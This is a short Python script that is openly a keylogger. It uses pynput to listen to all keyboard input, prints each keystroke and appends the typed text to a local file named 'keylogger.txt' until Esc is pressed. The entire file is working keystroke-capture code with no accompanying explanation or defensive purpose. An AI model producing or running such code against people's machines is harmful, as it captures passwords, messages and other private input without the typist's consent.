import pynput 

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # After every 1 key word, this will update the text file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc: # When esc pressed, the program will terminate
        return False

# Creating a text file to save keys
def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0: # Whenever space hit, this will create a new line in the text file
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()